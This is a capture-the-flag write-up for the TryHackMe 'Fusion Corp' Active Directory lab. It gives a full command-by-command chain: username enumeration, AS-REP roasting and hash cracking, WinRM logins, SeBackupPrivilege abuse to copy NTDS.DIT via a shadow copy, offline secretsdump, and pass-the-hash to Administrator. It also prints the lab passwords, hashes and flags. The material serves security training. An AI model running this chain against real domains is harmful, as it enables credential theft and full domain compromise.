# TryHackMe Fusion Corp — Full Writeup

## Overview

Fusion Corp is a **Medium**-difficulty Windows Active Directory room on TryHackMe. The attack chain involves: web enumeration to extract employee names, AS-REP Roasting, credential discovery via user comments, `SeBackupPrivilege` abuse with VSS shadow copy to extract NTDS.DIT, and offline hash dumping for full domain compromise.

## 1. Enumeration

```bash
nmap $IP -p- --open -sV -sC
```

Key open ports: 53 (DNS), 80 (HTTP/IIS), 88 (Kerberos), 139/445 (SMB), 389 (LDAP), 5985 (WinRM). Domain: `fusion.corp`, DC hostname: `Fusion-DC.fusion.corp`.

Add to `/etc/hosts`:
```
$IP Fusion-DC.fusion.corp fusion.corp
```

## 2. Web Enumeration — Employee Name Extraction

The web server on port 80 hosts an "eBusiness" template. Visiting the Team section reveals employee full names. An `employees.ods` spreadsheet was also found, which was converted and reviewed:

```bash
libreoffice --headless --convert-to csv employees.ods
cat employees.csv
```

From the names, a username list was generated using common AD naming conventions (e.g. `firstname[0]lastname`, `f.lastname`):

```
lparker
jmurphy
administrator
...
```

## 3. Username Enumeration via Kerbrute

```bash
kerbrute userenum -d fusion.corp --dc $IP /root/users.txt
```

Valid users confirmed: `lparker`, `jmurphy`, `administrator`.

## 4. AS-REP Roasting

```bash
python3 GetNPUsers.py fusion.corp/ -no-pass -usersfile /root/users.txt -dc-ip $IP
```

`lparker` returned an AS-REP hash (pre-authentication not required):

```
$krb5asrep$23$lparker@FUSION.CORP:767919f4...
```

## 5. Cracking the Hash

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep
```

**Result:** `lparker:!!abbylvzsvs2k6!`

## 6. Initial Access as lparker

```bash
evil-winrm -i $IP -u lparker -p '!!abbylvzsvs2k6!'
```

User flag retrieved:
```powershell
type C:\Users\lparker\Desktop\flag.txt
# THM{c105b6fb249741b89432fada8218f4ef}
```

`whoami /all` shows `lparker` has no special privileges — lateral movement needed.

## 7. Credential Discovery via User Comment

Enumerating user accounts revealed a plaintext password stored in `jmurphy`'s user comment field:

```powershell
net user jmurphy
# Comment: Password set to u8WC3!kLsgw=#bRY
```

Administrators sometimes store temporary passwords in the user comment/description field — always check this during enumeration.

## 8. Lateral Movement as jmurphy

```bash
evil-winrm -i $IP -u jmurphy -p 'u8WC3!kLsgw=#bRY'
```

User flag retrieved:
```powershell
type C:\Users\jmurphy\Desktop\flag.txt
# THM{b4aee2db2901514e28db4242e047612e}
```

`whoami /all` reveals critical privileges:
- `BUILTIN\Backup Operators` membership
- `SeBackupPrivilege` — can read any file regardless of permissions
- `SeRestorePrivilege` — can write to any file

## 9. SeBackupPrivilege Abuse — VSS Shadow Copy

`SeBackupPrivilege` allows bypassing file ACLs, but NTDS.DIT is locked while the DC is running. We use **DiskShadow** to create a Volume Shadow Copy (VSS snapshot), then copy NTDS.DIT from the snapshot using `robocopy /b` (backup mode):

**Step 1 — Create the DiskShadow script locally:**

```
set context persistent nowriters
add volume c: alias viper
create
expose %viper% x:
```

Convert to DOS line endings (required for DiskShadow):
```bash
unix2dos viper.dsh
```

**Step 2 — Upload and execute on the target:**

```powershell
mkdir C:\temp
upload /root/viper.dsh

diskshadow /s viper.dsh
```

This creates a VSS snapshot of `C:\` and exposes it as `X:\`.

**Step 3 — Copy NTDS.DIT from the shadow copy:**

```powershell
robocopy /b x:\windows\ntds . ntds.dit
```

`/b` flag enables backup mode, bypassing ACL restrictions via `SeBackupPrivilege`.

**Step 4 — Save the SYSTEM hive (needed to decrypt NTDS.DIT):**

```powershell
reg save HKLM\SYSTEM C:\temp\system
```

**Step 5 — Download both files:**

```powershell
download ntds.dit
download system
```

## 10. Offline Hash Extraction

```bash
python3 ~/impacket/examples/secretsdump.py \
  -ntds ntds.dit \
  -system system \
  LOCAL
```

`secretsdump.py` with `LOCAL` keyword parses the files offline without network access. It uses the SYSTEM hive to decrypt the PEK (Password Encryption Key) stored in NTDS.DIT, then decrypts all user hashes.

**Administrator hash extracted:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9653b02d945329c7270525c4c2a69c67:::
```

## 11. Pass-the-Hash as Administrator

```bash
evil-winrm -i $IP -u administrator -H '9653b02d945329c7270525c4c2a69c67'
```

Root flag retrieved:
```powershell
type C:\Users\Administrator\Desktop\flag.txt
# THM{f72988e57bfc1deeebf2115e10464d15}
```

## Attack Chain Summary

```
Web enum (employee names)
    → Username wordlist generation
    → Kerbrute (lparker, jmurphy)
    → AS-REP Roast (lparker hash)
    → John (!!abbylvzsvs2k6!)
    → evil-winrm as lparker [user flag 1]
    → net user jmurphy (password in comment)
    → evil-winrm as jmurphy [user flag 2]
    → SeBackupPrivilege + VSS shadow copy
    → robocopy /b NTDS.DIT + SYSTEM hive
    → secretsdump LOCAL (offline)
    → Pass-the-Hash Administrator
    → Full Domain Compromise [root flag]
```

## Glossary

| Term | Description |
|---|---|
| **AS-REP Roasting** | Requesting TGTs for accounts with Kerberos pre-auth disabled; encrypted response is crackable offline |
| **SeBackupPrivilege** | Windows privilege allowing file reads bypassing ACLs, granted to Backup Operators |
| **VSS / DiskShadow** | Volume Shadow Copy Service — creates point-in-time snapshots of locked files like NTDS.DIT |
| **robocopy /b** | Backup-mode copy that uses SeBackupPrivilege to bypass file permissions |
| **NTDS.DIT** | Active Directory database file containing all user password hashes |
| **SYSTEM hive** | Registry hive containing the boot key needed to decrypt NTDS.DIT |
| **Pass-the-Hash** | Authenticating with an NTLM hash instead of a plaintext password |
| **`LOCAL` (secretsdump)** | Offline mode — parses NTDS.DIT and SYSTEM hive without network connectivity |

---


